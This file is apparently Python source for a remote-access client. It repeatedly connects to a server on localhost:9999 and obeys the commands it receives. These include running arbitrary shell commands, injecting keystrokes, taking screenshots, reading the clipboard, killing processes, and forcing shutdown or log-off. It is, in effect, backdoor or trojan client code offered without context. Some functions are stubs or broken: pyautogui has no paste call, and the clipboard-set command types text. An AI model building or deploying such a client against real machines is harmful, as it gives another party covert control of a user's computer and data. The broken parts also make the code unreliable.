import socket
import subprocess
import webbrowser
import pyautogui
import time
import platform
import shutil

def start_client():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect(('localhost', 9999))
            print("Connected to the server.")
            break
        except Exception as e:
            print(f"Error connecting to the server: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            break
        elif command.lower().startswith('open website'):
            url = command[len('open website '):]
            open_website(url)
            response = f"Website {url} opened"
        elif command.lower().startswith('custom'):
            custom_command = command[len('custom '):]
            result = execute_command(custom_command)
            response = result
        elif command.lower().startswith('type'):
            text_to_type = command[len('type '):]
            type_with_pyautogui(text_to_type)
            response = f"Typed: {text_to_type}"
        elif command.lower().startswith('shortcut'):
            keys_to_press = command[len('shortcut '):]
            press_shortcut(keys_to_press)
            response = f"Pressed shortcut: {keys_to_press}"
        elif command.lower().startswith('open app'):
            app_name = command[len('open app '):]
            open_application(app_name)
            response = f"Opened application: {app_name}"
        elif command.lower().startswith('press key'):
            key_name = command[len('press key '):]
            press_key(key_name)
            response = f"Pressed key: {key_name}"
        elif command.lower().startswith('screenshot'):
            take_screenshot()
            response = "Screenshot captured"
        elif command.lower().startswith('upload file'):
            file_path = command[len('upload file '):]
            upload_file(file_path)
            response = f"File uploaded: {file_path}"
        elif command.lower().startswith('download file'):
            file_path = command[len('download file '):]
            download_file(file_path)
            response = f"File downloaded: {file_path}"
        elif command.lower().startswith('system info'):
            info = get_system_info()
            response = f"System Information:\n{info}"
        elif command.lower().startswith('process list'):
            processes = list_processes()
            response = f"Running Processes:\n{processes}"
        elif command.lower().startswith('terminate process'):
            process_name = command[len('terminate process '):]
            terminate_process(process_name)
            response = f"Terminated process: {process_name}"
        elif command.lower().startswith('shutdown'):
            shutdown()
            response = "Shutting down..."
        elif command.lower().startswith('restart'):
            restart()
            response = "Restarting..."
        elif command.lower().startswith('log off'):
            logoff()
            response = "Logging off..."
        elif command.lower().startswith('clipboard get'):
            clipboard_data = get_clipboard_data()
            response = f"Clipboard Data:\n{clipboard_data}"
        elif command.lower().startswith('clipboard set'):
            text_to_copy = command[len('clipboard set '):]
            set_clipboard_data(text_to_copy)
            response = f"Set Clipboard Data: {text_to_copy}"
        else:
            response = "Invalid command"

        client_socket.send(response.encode())

    client_socket.close()

def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return str(e)

def open_website(url):
    webbrowser.open(url)

def type_with_pyautogui(text):
    pyautogui.typewrite(text)

def press_shortcut(keys):
    pyautogui.hotkey(*keys.split(','))

def open_application(app_name):
    try:
        subprocess.Popen(app_name, shell=True)
    except Exception as e:
        print(f"Error opening application: {e}")

def press_key(key_name):
    pyautogui.press(key_name)

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

def upload_file(file_path):
    # Implement file upload logic here
    pass

def download_file(file_path):
    # Implement file download logic here
    pass

def get_system_info():
    system_info = platform.uname()
    return f"System: {system_info.system}\nNode: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}"

def list_processes():
    processes = subprocess.check_output(['tasklist'], shell=True, stderr=subprocess.STDOUT, text=True)
    return processes

def terminate_process(process_name):
    subprocess.run(['taskkill', '/F', '/IM', process_name], shell=True)

def shutdown():
    subprocess.run(['shutdown', '/s', '/t', '1'], shell=True)

def restart():
    subprocess.run(['shutdown', '/r', '/t', '1'], shell=True)

def logoff():
    subprocess.run(['shutdown', '/l'], shell=True)

def get_clipboard_data():
    clipboard_data = pyautogui.paste()
    return clipboard_data

def set_clipboard_data(text_to_copy):
    pyautogui.write(text_to_copy)


if __name__ == "__main__":
    start_client()
